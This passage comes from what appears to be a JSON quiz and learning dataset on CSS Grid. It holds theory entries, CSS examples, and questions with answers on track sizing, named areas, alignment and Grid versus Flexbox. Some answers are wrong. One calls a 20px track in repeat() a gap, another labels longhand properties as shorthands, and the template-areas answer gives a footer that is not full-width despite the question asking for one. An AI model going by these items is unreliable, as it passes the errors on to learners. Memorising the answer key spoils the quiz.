              "code": "```css\n.responsive-grid-autofit {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));\n  /* Creates as many columns as possible, collapses empty ones, \n     and items fill available space */\n  gap: 20px;\n  padding: 20px;\n  background-color: #d0d0d0;\n}\n\n.grid-item {\n  background-color: #90ee90;\n  border: 1px solid #66bb66;\n  padding: 20px;\n  text-align: center;\n}\n\n/* HTML Structure */\n/*\n<div class=\"responsive-grid-autofit\">\n  <div class=\"grid-item\">Item A</div>\n  <div class=\"grid-item\">Item B</div>\n  <div class=\"grid-item\">Item C</div>\n</div>\n*/\n```",
              "explanation": "Similar to `auto-fill`, but `auto-fit` will collapse any empty implicit tracks. In this example, if there are only 3 items but space for 5 columns, `auto-fit` will make the 3 items expand to fill the entire width, effectively collapsing the two empty tracks. This is often preferred when you want your items to always fill the available row space.",
              "language": "css"
            }
          ],
          "relatedQuestions": [
            "question_css_grid_advanced_1",
            "question_css_grid_advanced_2",
            "question_css_grid_advanced_3",
            "question_css_grid_advanced_4",
            "question_css_grid_advanced_5",
            "question_css_grid_advanced_6"
          ],
          "relatedTasks": [
            "task_grid_named_area_layout",
            "task_grid_responsive_gallery"
          ],
          "tags": [
            "CSS Grid",
            "Layout",
            "Named Areas",
            "Responsive Design",
            "Auto-placement",
            "Minmax",
            "Auto-fill",
            "Auto-fit"
          ],
          "technology": "CSS",
          "prerequisites": [
            "CSS Grid Fundamentals"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "requiredFor": [
            "Complex UI Layouts",
            "Component Design"
          ]
        },
        {
          "id": "theory_css_grid_alignment",
          "title": "CSS Grid Alignment: Positioning Items and Content",
          "content": "CSS Grid provides powerful alignment properties for both grid items (children) and the grid tracks themselves (the grid content within the container). These properties are typically applied to the grid container, affecting its direct children.\n\n## Key Concepts\n*   **Grid Item Positioning (`grid-column`, `grid-row`)**:\n    *   `grid-column`: Specifies an item's start and end column lines. Can be a line number (`1 / 3`), a span (`span 2`), or a named line.\n    *   `grid-row`: Specifies an item's start and end row lines. Similar usage to `grid-column`.\n    *   Shorthands: `grid-column-start`, `grid-column-end`, `grid-row-start`, `grid-row-end`.\n*   **Grid Item Alignment (applied to grid container, affecting items within their cells)**:\n    *   `justify-items`: Aligns grid items along the *inline (row)* axis within their grid cells. Values include `start`, `end`, `center`, `stretch` (default).\n    *   `align-items`: Aligns grid items along the *block (column)* axis within their grid cells. Values include `start`, `end`, `center`, `stretch` (default).\n    *   `place-items`: Shorthand for `align-items` and `justify-items` (e.g., `place-items: center` is `align-items: center; justify-items: center;`).\n    *   **Note**: Individual grid items can override these container-level alignments using `justify-self` and `align-self`.\n*   **Grid Container Alignment (applied to grid container, affecting the grid tracks within the container)**:\n    *   These properties align the *entire grid* within its container, similar to how Flexbox aligns items when there's extra space.\n    *   `justify-content`: Aligns grid tracks along the *inline (row)* axis within the grid container. Requires free space in the container's inline dimension. Values include `start`, `end`, `center`, `space-between`, `space-around`, `space-evenly`.\n    *   `align-content`: Aligns grid tracks along the *block (column)* axis within the grid container. Requires free space in the container's block dimension. Values include `start`, `end`, `center`, `space-between`, `space-around`, `space-evenly`.\n    *   `place-content`: Shorthand for `align-content` and `justify-content` (e.g., `place-content: center` is `align-content: center; justify-content: center;`).",
          "examples": [
            {
              "id": "example_grid_item_positioning_1",
              "title": "Positioning Grid Items",
              "code": "```css\n.grid-positioning {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr);\n  grid-template-rows: repeat(3, 100px);\n  gap: 10px;\n  border: 2px solid grey;\n  padding: 10px;\n}\n\n.item-a {\n  grid-column: 1 / 3; /* Spans from column line 1 to 3 (2 columns) */\n  grid-row: 1;\n  background-color: lightgreen;\n}\n\n.item-b {\n  grid-column: 2 / span 2; /* Starts at line 2, spans 2 columns */\n  grid-row: 2;\n  background-color: lightsalmon;\n}\n\n.item-c {\n  grid-area: 3 / 1 / 4 / 4; /* Shorthand: row-start / col-start / row-end / col-end */\n  background-color: lightblue;\n}\n\n/* HTML Structure */\n/*\n<div class=\"grid-positioning\">\n  <div class=\"item-a\">Item A</div>\n  <div class=\"item-b\">Item B</div>\n  <div class=\"item-c\">Item C</div>\n  <div>Other Item</div>\n  <div>Other Item</div>\n  <div>Other Item</div>\n</div>\n*/\n```",
              "explanation": "This example shows how `grid-column` and `grid-row` are used to explicitly place and size grid items. `item-a` spans the first two columns. `item-b` starts at the second column line and spans two columns. `item-c` uses the `grid-area` shorthand to define its position and span across multiple lines.",
              "language": "css"
            },
            {
              "id": "example_grid_item_alignment_1",
              "title": "Aligning Items within Cells (`place-items`)",
              "code": "```css\n.grid-item-alignment {\n  display: grid;\n  grid-template-columns: repeat(3, 150px);\n  grid-template-rows: repeat(2, 100px);\n  gap: 10px;\n  border: 2px solid #555;\n  height: 300px; /* Container height to show vertical alignment */\n  place-items: center; /* Centers items both horizontally and vertically within their cells */\n  background-color: #eee;\n}\n\n.grid-item {\n  width: 80px;\n  height: 60px;\n  background-color: #f08080;\n  border: 1px solid #a00;\n  font-size: 0.8em;\n  display: flex; /* To center text inside item */\n  justify-content: center;\n  align-items: center;\n}\n\n/* HTML Structure */\n/*\n<div class=\"grid-item-alignment\">\n  <div class=\"grid-item\">1</div>\n  <div class=\"grid-item\">2</div>\n  <div class=\"grid-item\">3</div>\n  <div class=\"grid-item\">4</div>\n  <div class=\"grid-item\">5</div>\n  <div class=\"grid-item\">6</div>\n</div>\n*/\n```",
              "explanation": "Here, `place-items: center` on the grid container centrally aligns all grid items within their respective grid cells. This is a shorthand for `justify-items: center` (horizontal) and `align-items: center` (vertical). Note that the grid items themselves have fixed `width` and `height` to make the alignment visible.",
              "language": "css"
            },
            {
              "id": "example_grid_content_alignment_1",
              "title": "Aligning Grid Content (`place-content`)",
              "code": "```css\n.grid-content-alignment {\n  display: grid;\n  grid-template-columns: 100px 100px;\n  grid-template-rows: 80px 80px;\n  gap: 10px;\n  width: 500px; /* Container wider than grid tracks */\n  height: 400px; /* Container taller than grid tracks */\n  border: 2px dashed #007bff;\n  background-color: #e6f7ff;\n  place-content: center; /* Centers the entire grid within its container */\n  /* Equivalently: justify-content: center; align-content: center; */\n}\n\n.grid-item {\n  background-color: #66b2ff;\n  border: 1px solid #0056b3;\n  padding: 10px;\n  text-align: center;\n}\n\n/* HTML Structure */\n/*\n<div class=\"grid-content-alignment\">\n  <div class=\"grid-item\">A</div>\n  <div class=\"grid-item\">B</div>\n  <div class=\"grid-item\">C</div>\n  <div class=\"grid-item\">D</div>\n</div>\n*/\n```",
              "explanation": "In this example, the grid container is larger than the total size of its grid tracks. `place-content: center` centers the *entire grid* horizontally and vertically within the `grid-content-alignment` container. This is useful for positioning the whole grid when there is extra space in the container.",
              "language": "css"
            }
          ],
          "relatedQuestions": [
            "question_css_grid_alignment_1",
            "question_css_grid_alignment_2",
            "question_css_grid_alignment_3",
            "question_css_grid_alignment_4",
            "question_css_grid_alignment_5",
            "question_css_grid_alignment_6"
          ],
          "relatedTasks": [
            "task_grid_aligned_gallery",
            "task_grid_complex_layout_alignment"
          ],
          "tags": [
            "CSS Grid",
            "Alignment",
            "Grid Items",
            "Grid Container",
            "Justify-items",
            "Align-items",
            "Place-items",
            "Justify-content",
            "Align-content",
            "Place-content",
            "Grid-column",
            "Grid-row"
          ],
          "technology": "CSS",
          "prerequisites": [
            "CSS Grid Fundamentals",
            "Advanced CSS Grid Layouts"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Precise Layout Control",
            "UI Component Development"
          ]
        },
        {
          "id": "theory_grid_vs_flexbox",
          "title": "CSS Grid vs. Flexbox: Choosing the Right Layout System",
          "content": "CSS Grid and Flexbox are both powerful layout modules, but they are designed for different purposes. Understanding their strengths allows for efficient and effective layout strategies, often by combining them.\n\n## CSS Grid: Best for:\n*   **Two-dimensional layouts**: Controls both rows and columns simultaneously. Ideal for laying out sections of a page or the entire page structure.\n*   **Overall page layouts**: Structures the main regions (header, sidebar, content, footer) of a website.\n*   **Complex, asymmetrical layouts**: When elements need to span multiple rows/columns or form non-uniform patterns.\n*   **Precise control over both dimensions**: Explicitly defines the size and position of tracks and items in both axes.\n*   **When you need to overlap elements**: Grid allows items to occupy the same grid cell, making overlapping straightforward.\n\n## Flexbox: Best for:\n*   **One-dimensional layouts**: Controls items either along a single row OR a single column.\n*   **Components and smaller-scale layouts**: Ideal for distributing space and aligning items within a navigation bar, a card component, or a list of items.\n*   **Distributing space and aligning items in a single dimension**: Excellent for centering, spacing out, or reordering items along one axis.\n*   **When content size should dictate layout**: Flex items naturally adapt their size based on their content and available space, making it good for 'fluid' lists.\n*   **When you need to reorder elements easily**: `order` property in Flexbox makes reordering visual order simple, regardless of DOM order.\n\n## Using Grid and Flexbox Together\nIt's common and often necessary to use both Grid and Flexbox within a single design. A common pattern is to use Grid for the macro-layout (overall page structure) and Flexbox for the micro-layout (arrangement of items within a grid cell or component). For example, a grid cell might contain a Flexbox container to arrange its internal elements.\n\n**Example Scenario:**\n*   **Grid**: Laying out the main `header`, `main`, `footer`, and `sidebar` areas of a webpage.\n*   **Flexbox**: Arranging navigation links within the `header`, buttons within a `footer` section, or items inside individual `card` components that reside within a grid cell.",
          "examples": [
            {
              "id": "example_grid_flexbox_combination_1",
              "title": "Grid for Page Layout, Flexbox for Component Layout",
              "code": "```css\n/* Grid for overall page layout */\n.page-wrapper {\n  display: grid;\n  grid-template-columns: 1fr 3fr;\n  grid-template-rows: auto 1fr auto;\n  grid-template-areas:\n    \"header header\"\n    \"sidebar content\"\n    \"footer footer\";\n  min-height: 100vh;\n  gap: 20px;\n  background-color: #f2f2f2;\n}\n\n.page-header { grid-area: header; background-color: #4CAF50; color: white; padding: 20px; }\n.page-sidebar { grid-area: sidebar; background-color: #f4f4f4; padding: 20px; border-right: 1px solid #ddd; }\n.page-content { grid-area: content; background-color: white; padding: 20px; }\n.page-footer { grid-area: footer; background-color: #333; color: white; padding: 20px; text-align: center; }\n\n/* Flexbox for navigation within the header */\n.nav-links {\n  display: flex;\n  justify-content: space-around; /* Distribute space evenly */\n  list-style: none;\n  padding: 0;\n  margin: 0;\n}\n\n.nav-links li a {\n  color: white;\n  text-decoration: none;\n  padding: 10px 15px;\n  background-color: #5cb85c;\n  border-radius: 5px;\n}\n\n/* HTML Structure */\n/*\n<div class=\"page-wrapper\">\n  <header class=\"page-header\">\n    <h1>My Website</h1>\n    <ul class=\"nav-links\">\n      <li><a href=\"#\">Home</a></li>\n      <li><a href=\"#\">About</a></li>\n      <li><a href=\"#\">Services</a></li>\n      <li><a href=\"#\">Contact</a></li>\n    </ul>\n  </header>\n  <aside class=\"page-sidebar\">\n    <p>Sidebar content here.</p>\n  </aside>\n  <main class=\"page-content\">\n    <h2>Welcome to the Main Content Area</h2>\n    <p>This is where the primary information of your page resides.</p>\n  </main>\n  <footer class=\"page-footer\">\n    <p>&copy; 2023 My Website</p>\n  </footer>\n</div>\n*/\n```",
              "explanation": "This example illustrates the common practice of combining Grid and Flexbox. The `.page-wrapper` uses CSS Grid to define the main structural areas of the page (header, sidebar, content, footer). Inside the `.page-header`, Flexbox is used on `.nav-links` to distribute and align the navigation items horizontally, demonstrating one-dimensional layout within a grid cell.",
              "language": "css"
            }
          ],
          "relatedQuestions": [
            "question_grid_flexbox_comparison_1",
            "question_grid_flexbox_comparison_2",
            "question_grid_flexbox_comparison_3",
            "question_grid_flexbox_comparison_4",
            "question_grid_flexbox_comparison_5",
            "question_grid_flexbox_comparison_6",
            "question_grid_flexbox_comparison_7"
          ],
          "relatedTasks": [
            "task_grid_flexbox_dashboard_layout"
          ],
          "tags": [
            "CSS Grid",
            "Flexbox",
            "Layout Comparison",
            "Responsive Design",
            "Frontend",
            "Best Practices",
            "Two-dimensional Layout",
            "One-dimensional Layout"
          ],
          "technology": "CSS",
          "prerequisites": [
            "CSS Grid Fundamentals",
            "Flexbox Fundamentals"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "Professional Web Development",
            "Optimal Layout Strategy"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_css_grid_fundamental_1",
          "topic": "CSS Grid Fundamentals",
          "level": "easy",
          "type": "mcq",
          "question": "Which CSS property is used to define a container as a Grid container?",
          "answer": "display: grid;",
          "options": [
            "display: flex;",
            "display: block;",
            "display: grid;",
            "display: table;"
          ],
          "analysisPoints": [
            "Tests basic knowledge of CSS Grid activation.",
            "Differentiates Grid from other display properties like Flexbox."
          ],
          "keyConcepts": [
            "display: grid",
            "Grid Container"
          ],
          "evaluationCriteria": [
            "Direct recall of CSS property names.",
            "Understanding the initial step of Grid layout."
          ],
          "example": "To enable CSS Grid for an element, you apply `display: grid;` to it. This makes the element a grid container, and its direct children become grid items.",
          "tags": [
            "CSS Grid",
            "Fundamentals",
            "MCQ"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_grid_fundamental_2",
          "topic": "CSS Grid Columns and Rows",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following CSS snippet:\n\n```css\n.grid-container {\n  display: grid;\n  grid-template-columns: 100px 2fr 1fr;\n  grid-template-rows: 50px auto;\n}\n```\n\nIf the grid container has a total width of 600px, what will be the calculated width of the second column?",
          "answer": "333.33px",
          "options": [
            "100px",
            "200px",
            "333.33px",
            "500px"
          ],
          "analysisPoints": [
            "Tests understanding of `fr` unit calculation.",
            "Requires calculating available space after fixed-size columns.",
            "Evaluates division of fractional units."
          ],
          "keyConcepts": [
            "grid-template-columns",
            "fr unit",
            "width calculation"
          ],
          "evaluationCriteria": [
            "Ability to perform calculations with `fr` units.",
            "Understanding of how fixed and fractional units interact."
          ],
          "example": "The total width is 600px. The first column takes 100px. Remaining space is 600px - 100px = 500px. The fractional units are 2fr and 1fr, totaling 3fr. Each `fr` is 500px / 3 = 166.66px. The second column is `2fr`, so its width is 2 * 166.66px = 333.33px.",
          "tags": [
            "CSS Grid",
            "Calculations",
            "fr unit",
            "MCQ"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_fundamental_3",
          "topic": "CSS Grid Gap Property",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the `gap` property in CSS Grid?",
          "answer": "To define the spacing between grid cells (rows and columns).",
          "analysisPoints": [
            "Distinguishes `gap` from padding or margin on items.",
            "Highlights its role in grid spacing."
          ],
          "keyConcepts": [
            "gap",
            "Grid Cells",
            "Spacing"
          ],
          "evaluationCriteria": [
            "Quick recall of property function.",
            "Understanding its scope within a grid."
          ],
          "example": "The `gap` property (which is a shorthand for `row-gap` and `column-gap`) creates space between the tracks themselves, not around the outer edges of the grid or individual items.",
          "tags": [
            "CSS Grid",
            "Gap",
            "Flashcard"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_grid_fundamental_4",
          "topic": "CSS Grid `repeat()` Function",
          "level": "medium",
          "type": "open",
          "question": "Explain how the `repeat()` function is used in `grid-template-columns` or `grid-template-rows` and provide an example. What advantage does it offer over explicitly listing track sizes?",
          "answer": "The `repeat()` function is a CSS Grid value that allows you to specify a pattern of columns or rows to be repeated a certain number of times. It takes two arguments: the number of times to repeat the pattern, and the track list to repeat.\n\n**Example:**\n`grid-template-columns: repeat(3, 1fr 20px);` This creates a pattern of `1fr` column followed by a `20px` gap, repeated three times, resulting in `1fr 20px 1fr 20px 1fr 20px` effectively.\n\n**Advantage:**\nIt offers conciseness and reduces redundancy in CSS code, especially when dealing with a large number of identically sized or patterned tracks. It makes the code more readable and easier to maintain. Without `repeat()`, you would have to manually list each `1fr` and `20px` value.",
          "analysisPoints": [
            "Defines `repeat()` function and its arguments.",
            "Provides a clear, practical example.",
            "Articulates the benefit (conciseness, readability, maintainability)."
          ],
          "keyConcepts": [
            "repeat() function",
            "grid-template-columns",
            "grid-template-rows",
            "Code conciseness"
          ],
          "evaluationCriteria": [
            "Clarity of explanation.",
            "Accuracy of example.",
            "Ability to identify practical benefits."
          ],
          "example": "The `repeat()` function is essential for creating grids with many uniform tracks without writing out each track definition.",
          "tags": [
            "CSS Grid",
            "repeat()",
            "Open-ended",
            "Code Optimization"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_fundamental_5",
          "topic": "CSS Grid: Defining a basic grid",
          "level": "easy",
          "type": "code",
          "question": "Write the CSS for a grid container named `.simple-grid` that has 3 equal-width columns and 2 rows, where the first row is 100px tall and the second row automatically adjusts its height. There should be a 15px gap between grid items.",
          "answer": "```css\n.simple-grid {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr);\n  grid-template-rows: 100px auto;\n  gap: 15px;\n}\n```",
          "analysisPoints": [
            "Tests ability to combine `display: grid`, `grid-template-columns`, `grid-template-rows`, and `gap`.",
            "Checks understanding of `repeat()` and `auto` keyword.",
            "Ensures correct syntax for defining columns and rows."
          ],
          "keyConcepts": [
            "display: grid",
            "grid-template-columns",
            "grid-template-rows",
            "gap",
            "repeat()",
            "fr unit",
            "auto"
          ],
          "evaluationCriteria": [
            "Correct application of core grid properties.",
            "Syntactic accuracy.",
            "Meeting all specified requirements."
          ],
          "example": "This solution demonstrates the fundamental properties for setting up a grid layout. `repeat(3, 1fr)` ensures three equally sized columns, `100px auto` defines the row heights, and `gap: 15px` sets the spacing.",
          "tags": [
            "CSS Grid",
            "Code Challenge",
            "Fundamentals"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_fundamental_6",
          "topic": "CSS Grid Units",
          "level": "medium",
          "type": "flashcard",
          "question": "What does the `fr` unit represent in CSS Grid, and why is it useful?",
          "answer": "The `fr` (fractional) unit represents a fraction of the available space in the grid container. It's useful because it allows grid items to scale proportionally to the remaining space, making it easy to create flexible and responsive layouts without complex calculations.",
          "analysisPoints": [
            "Defines `fr` unit.",
            "Explains its practical advantage in responsive design.",
            "Compares its dynamic nature to fixed units."
          ],
          "keyConcepts": [
            "fr unit",
            "Responsive Design",
            "Flexible Layouts"
          ],
          "evaluationCriteria": [
            "Accurate definition.",
            "Clear explanation of utility."
          ],
          "example": "If `grid-template-columns: 1fr 2fr;`, the second column will be twice the width of the first, filling the remaining space after any fixed-size tracks.",
          "tags": [
            "CSS Grid",
            "fr unit",
            "Flashcard"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals"
          ],
          "complexity": 4,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_advanced_1",
          "topic": "CSS Grid Named Areas",
          "level": "medium",
          "type": "mcq",
          "question": "Given the following CSS Grid definition:\n\n```css\n.grid-layout {\n  display: grid;\n  grid-template-columns: 1fr 2fr;\n  grid-template-rows: auto 1fr auto;\n  grid-template-areas:\n    \"header header\"\n    \"sidebar main\"\n    \"footer footer\";\n}\n\n.item-a { grid-area: sidebar; }\n.item-b { grid-area: header; }\n.item-c { grid-area: main; }\n```\n\nWhich grid area will `item-b` occupy?",
          "answer": "The entire top row, spanning both columns.",
          "options": [
            "The first column of the second row.",
            "The entire top row, spanning both columns.",
            "The second column of the second row.",
            "The entire bottom row, spanning both columns."
          ],
          "analysisPoints": [
            "Tests understanding of `grid-template-areas` syntax.",
            "Checks how `grid-area` on items maps to named areas.",
            "Evaluates the concept of areas spanning multiple cells."
          ],
          "keyConcepts": [
            "grid-template-areas",
            "grid-area",
            "Named Grid Areas"
          ],
          "evaluationCriteria": [
            "Correct interpretation of grid area definitions.",
            "Ability to trace item placement based on named areas."
          ],
          "example": "The `\"header header\"` string in `grid-template-areas` defines the top row, with the 'header' area spanning both columns. Since `.item-b` is assigned `grid-area: header;`, it will occupy this entire top row.",
          "tags": [
            "CSS Grid",
            "Named Areas",
            "MCQ"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals",
            "Advanced CSS Grid Layouts"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_advanced_2",
          "topic": "CSS Grid `auto-fill` vs. `auto-fit`",
          "level": "hard",
          "type": "open",
          "question": "Compare and contrast `auto-fill` and `auto-fit` in the context of `grid-template-columns` with `minmax()`. Provide a scenario where each would be more appropriate.",
          "answer": "Both `auto-fill` and `auto-fit` are used with `repeat()` and `minmax()` to create responsive grids that automatically adjust the number of columns. They aim to fill the available space while respecting the `minmax` constraints.\n\n**`auto-fill`:**\n*   **Behavior:** Creates as many columns as possible that fit into the container, even if there are not enough grid items to fill all the created columns. It will keep empty tracks (implicit grid tracks) in the layout.\n*   **Effect:** When there's extra space, it will create empty 'slots' or tracks. If grid items don't fill all slots, the items will maintain their `minmax` size, and the empty tracks will exist.\n*   **Scenario:** Useful when you want to maintain a consistent column count, or you are adding items dynamically and want new items to simply 'fill' an available slot without disturbing the existing items' sizing. E.g., a photo gallery where you want consistent gaps and fixed-size thumbnails, and don't mind empty space if there aren't enough images to fill the last row perfectly.\n\n**`auto-fit`:**\n*   **Behavior:** Behaves identically to `auto-fill` initially, creating as many columns as possible. However, if there are empty tracks, `auto-fit` will *collapse* them to 0px, causing the actual grid items to expand and take up the available space within the container.\n*   **Effect:** When items don't fill all possible columns, `auto-fit` makes the existing items grow to fill the remaining space, effectively 'fitting' them to the available width by collapsing implicit empty tracks.\n*   **Scenario:** Ideal for dynamic content lists or card layouts where you want the items to always fill the available row space, even if there are fewer items than could theoretically fit. E.g., a product listing where you always want the product cards to stretch and fill the entire width of the container, regardless of how many items are currently displayed in a row.\n\n**Key Difference:** `auto-fill` maintains empty implicit tracks, `auto-fit` collapses them, allowing actual items to expand.",
          "analysisPoints": [
            "Clearly defines `auto-fill` and `auto-fit` behaviors.",
            "Explains the impact on empty tracks/items.",
            "Provides realistic, distinct use-case scenarios for each.",
            "Highlights the core difference concisely."
          ],
          "keyConcepts": [
            "auto-fill",
            "auto-fit",
            "minmax()",
            "Responsive Design",
            "Grid Tracks"
          ],
          "evaluationCriteria": [
            "Comprehensive and accurate comparison.",
            "Relevant and practical examples.",
            "Clarity of explanation."
          ],
          "example": "```css\n/* auto-fill: always leaves empty slots if items don't fill */\n.grid-autofill {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));\n}\n\n/* auto-fit: collapses empty slots, items expand */\n.grid-autofit {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));\n}\n```",
          "tags": [
            "CSS Grid",
            "Responsive Design",
            "auto-fill",
            "auto-fit",
            "minmax()",
            "Open-ended",
            "Advanced"
          ],
          "prerequisites": [
            "Advanced CSS Grid Layouts"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_css_grid_advanced_3",
          "topic": "CSS Grid Item Placement",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the `grid-area` shorthand property for, and how is its four-value syntax interpreted?",
          "answer": "`grid-area` is a shorthand property used on a grid item to specify its size and location in the grid by contributing to all four `grid-*` line properties (row-start, column-start, row-end, column-end) or by referencing a named grid area.\n\nWhen using the four-value syntax (`row-start / column-start / row-end / column-end`), it defines the item's position:\n1.  `grid-row-start`\n2.  `grid-column-start`\n3.  `grid-row-end`\n4.  `grid-column-end`",
          "analysisPoints": [
            "Defines `grid-area`'s purpose.",
            "Explains the four-value shorthand interpretation.",
            "Highlights its dual use (named areas or line numbers)."
          ],
          "keyConcepts": [
            "grid-area",
            "Shorthand properties",
            "Grid lines",
            "Named Grid Areas"
          ],
          "evaluationCriteria": [
            "Accuracy of definition.",
            "Correct interpretation of shorthand values."
          ],
          "example": "An item placed with `grid-area: 2 / 3 / 4 / 5;` would start at row line 2, column line 3, and span until row line 4, column line 5.",
          "tags": [
            "CSS Grid",
            "Grid-area",
            "Shorthand",
            "Flashcard"
          ],
          "prerequisites": [
            "Advanced CSS Grid Layouts"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_advanced_4",
          "topic": "CSS Grid Auto-Placement",
          "level": "easy",
          "type": "mcq",
          "question": "If a grid item is a direct child of a grid container but does not have `grid-row`, `grid-column`, or `grid-area` explicitly defined, how is it placed in the grid?",
          "answer": "It is automatically placed by the grid's auto-placement algorithm.",
          "options": [
            "It is ignored and not displayed.",
            "It behaves as a block-level element outside the grid.",
            "It is automatically placed by the grid's auto-placement algorithm.",
            "It takes up the entire first grid cell."
          ],
          "analysisPoints": [
            "Tests understanding of default grid behavior.",
            "Reinforces the concept of auto-placement.",
            "Differentiates auto-placement from manual placement."
          ],
          "keyConcepts": [
            "Auto-placement",
            "Grid Items",
            "Default behavior"
          ],
          "evaluationCriteria": [
            "Correct recall of default grid item behavior.",
            "Understanding of grid's implicit functionality."
          ],
          "example": "Grid items that are not explicitly positioned will be placed according to the `grid-auto-flow` property (defaulting to `row`), filling available cells sequentially.",
          "tags": [
            "CSS Grid",
            "Auto-placement",
            "MCQ"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals"
          ],
          "complexity": 3,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_grid_advanced_5",
          "topic": "CSS Grid Template Areas",
          "level": "medium",
          "type": "code",
          "question": "Create the CSS for a `grid-template-areas` property that defines a layout with a full-width header, a sidebar on the left spanning two rows, main content, and a full-width footer. The main content should be next to the sidebar and occupy the second row. Use appropriate named areas.",
          "answer": "```css\n.page-layout {\n  display: grid;\n  grid-template-columns: 1fr 3fr; /* Example column definition */\n  grid-template-rows: auto 1fr auto; /* Example row definition */\n  grid-template-areas:\n    \"header header\"\n    \"sidebar main\"\n    \"sidebar footer\";\n}\n\n/* Example item assignments */\n.header-item { grid-area: header; }\n.sidebar-item { grid-area: sidebar; }\n.main-item { grid-area: main; }\n.footer-item { grid-area: footer; }\n```",
          "analysisPoints": [
            "Tests ability to translate layout requirements into `grid-template-areas` syntax.",
            "Checks understanding of how named areas span rows/columns.",
            "Ensures correct use of identical names for spanning."
          ],
          "keyConcepts": [
            "grid-template-areas",
            "Named Grid Areas",
            "Layout definition"
          ],
          "evaluationCriteria": [
            "Correct syntax for `grid-template-areas`.",
            "Accurate representation of the requested layout.",
            "Demonstrates understanding of area spanning."
          ],
          "example": "The solution defines a 2-column, 3-row grid. 'header' spans both columns in the first row. 'sidebar' spans the first column of the second and third rows. 'main' takes the second column of the second row, and 'footer' takes the second column of the third row.",
          "tags": [
            "CSS Grid",
            "Code Challenge",
            "Named Areas"
          ],
          "prerequisites": [
            "Advanced CSS Grid Layouts"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_advanced_6",
          "topic": "CSS Grid `minmax()` Function",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the purpose of the `minmax()` function in CSS Grid, and what are its two arguments?",
          "answer": "The `minmax()` function defines a size range for a grid track (row or column). It ensures that the track will be no smaller than its `min` value and no larger than its `max` value.\n\nIts two arguments are:\n1.  **`min`**: The minimum size for the track.\n2.  **`max`**: The maximum size for the track.",
          "analysisPoints": [
            "Defines the function's purpose.",
            "Correctly identifies and explains its arguments.",
            "Highlights its role in responsive sizing."
          ],
          "keyConcepts": [
            "minmax()",
            "Grid Track Sizing",
            "Responsive Design"
          ],
          "evaluationCriteria": [
            "Accuracy of definition.",
            "Correct explanation of arguments.",
            "Understanding of utility."
          ],
          "example": "`grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));` means columns will be at least 250px, but can grow to fill available space.",
          "tags": [
            "CSS Grid",
            "minmax()",
            "Flashcard"
          ],
          "prerequisites": [
            "Advanced CSS Grid Layouts"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_alignment_1",
          "topic": "CSS Grid Item Alignment",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following CSS properties would you apply to a **grid container** to vertically center all of its direct grid items within their respective grid cells?",
          "answer": "align-items: center;",
          "options": [
            "justify-items: center;",
            "align-content: center;",
            "align-items: center;",
            "justify-content: center;"
          ],
          "analysisPoints": [
            "Distinguishes `items` properties from `content` properties.",
            "Differentiates `align` (block/vertical) from `justify` (inline/horizontal).",
            "Focuses on property application to the container, affecting items."
          ],
          "keyConcepts": [
            "align-items",
            "justify-items",
            "Grid Item Alignment",
            "Grid Container"
          ],
          "evaluationCriteria": [
            "Correct identification of alignment property.",
            "Understanding of vertical vs. horizontal alignment.",
            "Knowledge of where properties are applied."
          ],
          "example": "Applying `align-items: center;` to the grid container ensures that each child item is centered vertically within its own grid cell.",
          "tags": [
            "CSS Grid",
            "Alignment",
            "MCQ"
          ],
          "prerequisites": [
            "CSS Grid Alignment"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_alignment_2",
          "topic": "CSS Grid Content Alignment",
          "level": "medium",
          "type": "open",
          "question": "Explain the difference between `justify-items: center;` and `justify-content: center;` when used on a CSS Grid container.",
